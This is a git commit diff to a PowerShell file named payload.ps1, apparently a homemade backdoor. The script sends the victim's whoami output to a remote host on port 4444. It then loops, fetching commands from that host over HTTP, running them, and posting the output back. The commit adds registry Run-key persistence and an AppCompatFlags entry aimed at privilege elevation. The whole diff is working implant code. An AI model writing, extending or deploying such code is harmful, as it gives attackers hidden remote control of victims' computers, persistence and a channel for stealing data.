64ca9df5e8d6a5f0572ed21b35098961251a90a3
Mood56467 <100055549+Mood56467@users.noreply.github.com>
2024-02-09 20:25:36 -0800

    payload.ps1

--- payload.ps1
+++ payload.ps1
@@ -8,20 +8,28 @@ $hmal += whoami
 
 $Response = Invoke-WebRequest -Timeout 1 -Method Post -URI 192.168.2.190:4444 -Body $hmal -UseBasicParsing
 
+#attempt to set per
+
+New-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" `
+    -Name "%HOMEPATH%\payload.ps1" `
+    -Value "%HOMEPATH%\payload.ps1 -autostart"
+
+# attempt to elevate permissions on next execution
+
+New-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Layers" `
+    -Name "%HOMEPATH%\payload.ps1" `
+    -Value "%HOMEPATH%\payload.ps1"
+
 while ($true)
 {
 
 	$I = Invoke-WebRequest -Timeout 1 'http://192.168.2.190:80' | Select-Object -Expand Content
 
-	$MAIN = powershell /c $I
+	$MAIN = powershell /c $I 
 
 	if($MAIN -eq $FALSE){
 	}else{ 
-	$Response = Invoke-WebRequest -Method Post -URI 192.168.2.190:4444 -Body $MAIN -UseBasicParsing	
+	$Response = Invoke-WebRequest -Timeout 1 -Method Post -URI 192.168.2.190:4444 -Body $MAIN -UseBasicParsing	
 	}
-	sleep 1
+	sleep 0.5
 }
-
-
-
-
